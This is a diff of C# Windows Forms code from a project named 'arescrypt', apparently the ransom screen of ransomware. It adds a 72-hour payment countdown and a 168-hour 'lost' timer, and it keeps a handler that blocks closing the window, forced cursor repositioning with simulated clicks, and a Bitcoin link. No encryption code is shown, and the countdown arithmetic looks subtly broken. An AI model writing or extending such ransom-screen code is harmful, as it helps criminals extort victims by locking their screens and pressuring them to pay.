@@ -25,24 +25,28 @@ namespace arescrypt
         private void Display_Load(object sender, EventArgs e) { }
 
         Point cursorPos = new Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
-        private void timer1_tick(object sender, EventArgs e)
+
+
+        // 168:00:00
+        private void lostTimer_Tick(object sender, EventArgs e)
         {
-            
-            Size size = Screen.PrimaryScreen.Bounds.Size;
-            size.Height -= 10; size.Width -= 10;
-            this.Size = size; this.Location = new Point(0, 0);
-            this.textBox1.Size = new Size(new Point(this.Size.Width / 2 - 12, textBox1.Size.Height));
-            textBox1.Location = new Point(this.Size.Width - textBox1.Size.Width - 12, this.Size.Height - textBox1.Size.Height - 12);
-            textBox1.Visible = true;
-            Cursor.Position = cursorPos;
-            mouse_event(0x002 | 0x004);
-            
         }
 
-        int timeLeft = 259200;
-        private void timer1_Tick(object sender, EventArgs e)
+        // 72:00:00
+        int riseTimer_Hours = 0x48; int riseTimer_Minutes = 0x0; int riseTimer_Seconds = 0x0;
+        private void riseTimer_Tick(object sender, EventArgs e)
         {
-            Console.WriteLine("Seconds left: " + timeLeft--);
+            if (riseTimer_Minutes == 0x0 && riseTimer_Seconds == 0x0)
+            {
+                riseTimer_Hours--; // Decrement 'Hours' variable
+                riseTimer_Minutes = 0x3C; // 60
+            } else if (riseTimer_Minutes == 0x3C && riseTimer_Seconds == 0x0)
+            {
+                riseTimer_Minutes--;
+            }
+
+            riseTimer_Seconds--;
+            paymentTimer_Rise.Text = riseTimer_Hours + ":" + riseTimer_Minutes + ":" + riseTimer_Seconds;
         }
 
         private void preventClose(object sender, FormClosingEventArgs e)
@@ -59,8 +63,6 @@ namespace arescrypt
             Cursor.Position = cursorPos;
             mouse_event(0x002 | 0x004);
         }
-
-        private void RiseTimer_Tick(object sender, EventArgs e) { }
 
         private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         { Process.Start("https://bitcoin.org"); }
